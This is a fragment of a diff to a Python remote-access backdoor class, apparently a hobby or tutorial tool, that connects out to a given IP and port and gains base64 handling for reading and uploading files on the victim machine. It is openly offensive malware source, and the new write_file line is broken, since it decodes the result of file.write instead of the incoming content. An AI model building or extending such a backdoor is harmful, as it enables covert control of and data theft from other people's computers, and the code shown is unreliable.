@@ -3,6 +3,7 @@ import socket
 import json
 import subprocess
 import os
+import base64
 
 class Backdoor:
     def __init__(self,ip,port):
@@ -31,11 +32,11 @@ class Backdoor:
 
     def read_file(self,path):
         with open(path,"rb") as file:
-            return file.read()
+            return base64.b64encode(file.read())
 
     def write_file(self,path,content):
         with open(path,"wb") as file:
-            file.write(content)
+            base64.b64decode(file.write(content))
             return "[+] upload successful"
 
     def Run(self):
